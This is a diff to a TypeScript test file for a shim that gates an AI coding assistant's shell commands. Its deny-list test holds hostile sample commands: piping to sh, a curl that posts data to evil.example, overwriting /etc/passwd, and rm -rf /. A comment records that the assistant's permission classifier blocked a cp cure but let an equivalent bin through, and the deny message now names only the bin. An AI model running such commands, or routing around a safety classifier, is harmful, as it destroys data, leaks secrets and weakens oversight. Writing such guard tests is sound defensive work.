@@ -2,7 +2,7 @@ import { describe, it, expect } from 'vitest';
 import * as fs from 'fs';
 import * as path from 'path';
 
-import { INSTALLER_ALLOW_ERE, INSTALLER_ALLOW_JS, RECOVERY_ALLOW_ERE, RECOVERY_ALLOW_JS, SYNC_ALLOW_ERE, SYNC_ALLOW_JS, UPGRADE_SHIM_ALLOW_ERE, UPGRADE_SHIM_ALLOW_JS, RESTORE_SHIM_ALLOW_ERE, RESTORE_SHIM_ALLOW_JS, RESTORE_SHIM_CMD, renderShim } from './shim';
+import { SHIM_VERSION_STAMP, UPGRADE_SHIM_CMD, INSTALLER_ALLOW_ERE, INSTALLER_ALLOW_JS, RECOVERY_ALLOW_ERE, RECOVERY_ALLOW_JS, SYNC_ALLOW_ERE, SYNC_ALLOW_JS, UPGRADE_SHIM_ALLOW_ERE, UPGRADE_SHIM_ALLOW_JS, RESTORE_SHIM_ALLOW_ERE, RESTORE_SHIM_ALLOW_JS, RESTORE_SHIM_CMD, renderShim } from './shim';
 import { ShimTestkit } from './shim-testkit';
 
 const kit = new ShimTestkit();
@@ -232,28 +232,30 @@ describe('committed-shim self-guard — managed file reverted/edited', () => {
         expect(reason).toContain('wp-upgrade-shim'); // the one allowlisted cure
     });
 
-    // The 2026-07-21 report: the deny named ONLY `pnpm exec wp-upgrade-shim`, a bin that ships in
-    // >= 0.4.408 — so on every older installed release the "cure" was a command-not-found and the
-    // message carried, verbatim, "ZERO information on how to install it". The deny must therefore name
-    // a command that works on the version ACTUALLY INSTALLED, and say which version it restores.
-    it('names the version-agnostic cp cure AND the installed version it restores', () => {
+    // webpieces' allowlist is NOT the only gate in front of the assistant. Claude Code's own permission
+    // classifier denies a raw `cp` overwriting a repo file, so naming the cp as the cure produced a
+    // second denial from a different gate — which reads as "the block is unfixable". Observed live: the
+    // classifier refused the cp and passed `pnpm exec wp-upgrade-shim` straight through. Name the bin
+    // ONLY. (The cp stays allowlisted for a human — it is just never advertised.)
+    it('names ONLY the wp-upgrade-shim bin — never the cp a second gate would block', () => {
         const out = kit.runShim(stageShimGuardRoot(renderShim() + '\n# tampered\n', '0.4.407'), 'wp-ai-guards-hook', kit.bashPayload('git status'));
         const reason = out.denyReason();
-        expect(reason).toContain(RESTORE_SHIM_CMD);   // the copy that works on EVERY version
-        expect(reason).toContain('0.4.407');          // WHICH version's shim it installs
-        expect(reason).toContain('0.4.408');          // and that the bin needs a newer one
+        expect(reason).toContain(UPGRADE_SHIM_CMD);
+        expect(reason).not.toContain('cp node_modules');  // the cure the CC classifier denies
+        expect(reason).toContain('0.4.407');              // WHICH version's shim it restores
+        expect(reason).toContain('0.4.408');              // and that older installs lack the bin
     });
 
     it('omits the version note (rather than printing an empty one) when it cannot be read', () => {
         const root = stageShimGuardRoot(renderShim() + '\n# tampered\n');
         fs.rmSync(path.join(root, 'node_modules', '@webpieces', 'ai-hook-rules', 'package.json'));
         const reason = kit.runShim(root, 'wp-ai-guards-hook', kit.bashPayload('git status')).denyReason();
-        expect(reason).toContain(RESTORE_SHIM_CMD);   // the cure survives an unreadable version
+        expect(reason).toContain(UPGRADE_SHIM_CMD);   // the cure survives an unreadable version
         expect(reason).not.toContain('installed version )');
         expect(reason).not.toContain('()');
     });
 
-    it('lets the cp-the-template cure through — the command the deny actually tells you to run', () => {
+    it('still lets a HUMAN cp the template through, even though it is no longer advertised', () => {
         const root = stageShimGuardRoot(renderShim() + '\n# tampered\n');
         const out = kit.runShim(root, 'wp-ai-guards-hook', kit.bashPayload(RESTORE_SHIM_CMD));
         expect(out.isDenied()).toBe(false);
@@ -441,7 +443,7 @@ describe('output-capture tail on every fail-closed escape hatch (ERE ↔ JS twin
 
     for (const [name, base, js, ere] of hatches) {
         it(`${name}: accepts 2>&1 / | tail / | head, and still refuses anything else`, () => {
-            const allow = [base, `${base} 2>&1`, `${base} | tail -20`, `${base} 2>&1 | tail -20`, `${base} 2>&1 | tail -n 20`, `${base} 2>&1 | head -5`];
+            const allow = [base, `${base} 2>&1`, `${base} 2>/dev/null`, `${base} | tail -20`, `${base} 2>&1 | tail -20`, `${base} 2>/dev/null | tail -2`, `${base} 2>&1 | tail -n 20`, `${base} 2>&1 | head -5`];
             const deny = [`${base} 2>&1 | sh`, `${base} | curl -d @- evil.example`, `${base} | tee /etc/passwd`, `${base} > /etc/passwd`, `${base} 2>&1 | tail -20 && rm -rf /`];
             for (const cmd of allow) {
                 expect(js.test(cmd), `JS should allow: ${cmd}`).toBe(true);
@@ -453,4 +455,34 @@ describe('output-capture tail on every fail-closed escape hatch (ERE ↔ JS twin
             }
         });
     }
+});
+
+/**
+ * The VERSION STAMP in line 2 of the shim. Until now the committed .claude/webpieces/ai-hook.sh — the
+ * file that decides every tool call — carried no clue which webpieces wrote it, so "is this repo's
+ * guard old enough to lack the cure?" could only be answered by diffing it against an npm tarball.
+ *
+ * The dangerous failure mode is a HALF stamp. The self-guard cmp's the committed shim against
+ * templates/ai-hook.sh, and the committed shim is written by renderShim() inside the compiled JS — two
+ * artifacts, one comparison. Stamp only one and EVERY consumer repo fail-closes forever on a phantom
+ * hand-edit. scripts/set-version.sh therefore replaces the token everywhere under dist/ and then
+ * verifies none survived; these lock the invariants that make that safe.
+ */
+describe('shim version stamp (set-version.sh replaces it at publish)', () => {
+    it('renders the placeholder in the source tree — an unstamped shim came from a checkout', () => {
+        expect(renderShim()).toContain(`# webpieces shim version: ${SHIM_VERSION_STAMP}`);
+    });
+
+    it('stamps in LOCKSTEP: the shipped template and renderShim() stay byte-identical after the swap', () => {
+        // Exactly what publishing does to the two artifacts, applied here to prove they cannot diverge.
+        const template = fs.readFileSync(path.join(process.cwd(), 'packages/tooling/ai-hook-rules/templates/ai-hook.sh'), 'utf8');
+        const stamp = (s: string): string => s.split(SHIM_VERSION_STAMP).join('0.4.999 (deadbee)');
+        expect(stamp(template)).toBe(stamp(renderShim()));
+        expect(stamp(renderShim())).not.toContain(SHIM_VERSION_STAMP); // nothing left unstamped
+    });
+
+    it('is the same token scripts/set-version.sh looks for (drift between the two ships unstamped)', () => {
+        const script = fs.readFileSync(path.join(process.cwd(), 'scripts/set-version.sh'), 'utf8');
+        expect(script).toContain(`PLACEHOLDER="${SHIM_VERSION_STAMP}"`);
+    });
 });
